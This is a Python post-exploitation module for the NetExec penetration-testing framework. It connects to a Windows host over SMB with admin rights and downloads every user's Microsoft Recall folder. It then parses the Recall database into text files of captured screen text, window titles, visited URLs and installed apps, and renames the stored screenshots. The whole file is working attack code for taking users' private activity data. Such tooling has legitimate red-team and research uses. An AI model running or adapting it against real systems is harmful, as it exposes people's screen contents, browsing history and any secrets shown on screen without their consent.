from impacket import smb, smb3
import ntpath
from os import rename
from os.path import split, join, splitext, dirname, abspath
from glob import glob
from sqlite3 import connect

class NXCModule:
    """
    Recall
    -------
    Module by @Marshall-Hallenbeck (@mjhallenbeck on Twitter)
    Inspired by https://github.com/xaitax/TotalRecall (code my own)
    """

    name = "recall"
    description = "Downloads Microsoft Recall folders for all users"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.context = None
        self.module_options = None

    def options(self, context, module_options):
        """
        USERS           Download only specified user(s); format: -o USERS=user1,user2,user3
        SILENT          Do not display individual file download messages; set to enable
        """
        self.context = context
        self.recall_path_stub = "\\AppData\\Local\\CoreAIPlatform.00\\UKP\\"
        self.users = module_options["USERS"] if "USERS" in module_options else None
        self.silent = module_options["SILENT"] if "SILENT" in module_options else False


    def on_admin_login(self, context, connection):
        output_path = f"recall_{connection.host}"
        context.log.debug("Getting all user Recall folders")
        user_folders = connection.conn.listPath("C$", "\\Users\\*")
        context.log.debug(f"User folders: {user_folders}")
        if not user_folders:
            self.context.log.fail("No User folders found!")
        else:
            context.log.display("User folder(s) found, attempting to dump Recall contents (no output means no Recall folder)")
        
        for user_folder in user_folders:
            if not user_folder.is_directory():
                continue
            folder_name = user_folder.get_longname()
            context.log.debug(f"{folder_name=} {self.users=}")
            if folder_name in [".", "..", "All Users", "Default", "Default User", "Public"]:
                continue
            if self.users and folder_name not in self.users:
                self.context.log.debug(f"Specific users are specified and {folder_name} is not one of them")
                continue
            
            recall_path = ntpath.normpath(join(r"Users", folder_name, self.recall_path_stub))
            context.log.debug(f"Checking for Recall folder {recall_path}")
            try:
                connection.conn.listPath("C$", recall_path)
            except Exception:
                context.log.debug(f"Recall folder {recall_path} not found!")
                continue
            user_output_dir = join(output_path, folder_name)
            try:
                context.log.display(f"Downloading Recall folder for user {folder_name}")
                connection.download_folder(recall_path, user_output_dir, True)
            except (smb.SessionError, smb3.SessionError):
                context.log.debug(f"Folder {recall_path} not found!")
                
            context.log.success(f"Recall folder for user {folder_name} downloaded to {user_output_dir}")
            self.rename_screenshots(user_output_dir)
        
        context.log.debug("Parsing Recall DB files...")
        db_files = glob(f"{output_path}/*/*/ukg.db")
        for db in db_files:
            self.parse_recall_db(db)

    def parse_recall_db(self, db_path):
        self.context.log.debug(f"Parsing Recall database {db_path}")
        parent = abspath(dirname(dirname(db_path)))
        self.context.log.debug(f"Parent: {parent}")
        conn = connect(db_path)
        c = conn.cursor()

        win_text_cap_tab = "WindowCaptureTextIndex_content"
        joined_q = f"""
        SELECT t1.c1, t2.c2
        FROM {win_text_cap_tab} AS t1
        JOIN {win_text_cap_tab} AS t2 ON t1.c0 = t2.c0
        WHERE t1.c1 IS NOT NULL AND t2.c2 IS NOT NULL;
        """
        c.execute(joined_q)
        window_content = c.fetchall()
        with open(join(parent, "window_content.txt"), "w") as file:
            file.writelines(f"{row[0]}, {row[1]}\n" for row in window_content)

        window_q = f"SELECT c1 FROM {win_text_cap_tab} WHERE c1 IS NOT NULL;"
        c.execute(window_q)
        windows = c.fetchall()
        with open(join(parent, "windows.txt"), "w") as file:
            file.writelines(f"{row[0]}\n" for row in windows)

        content_q = f"SELECT c2 FROM {win_text_cap_tab} WHERE c2 IS NOT NULL;"
        c.execute(content_q)
        content = c.fetchall()
        with open(join(parent, "content.txt"), "w") as file:
            file.writelines(f"{row[0]}\n" for row in content)
        
        web_tab = "Web"
        web_q = f"""
        SELECT Uri FROM {web_tab};
        """
        c.execute(web_q)
        uris = c.fetchall()
        with open(join(parent, "uris.txt"), "w") as file:
            file.writelines(f"{row[0]}\n" for row in uris)
            
        app_tab = "App"
        app_q = f"""
        SELECT Name, WindowsAppId, Path FROM {app_tab};
        """
        c.execute(app_q)
        apps = c.fetchall()
        with open(join(parent, "apps.txt"), "w") as file:
            file.writelines(f"{row[0]}, {row[1]}, {row[2]}\n" for row in apps)

    
    def rename_screenshots(self, path):
        self.context.log.debug(f"Renaming screenshots at {path}")
        files = glob(f"{path}/*/ImageStore/*")
        self.context.log.debug(f"Files to rename: {files}")
        for file in files:
            directory, filename = split(file)
            if not splitext(filename)[1]:
                rename(file, join(directory, f"{filename}.jpg"))
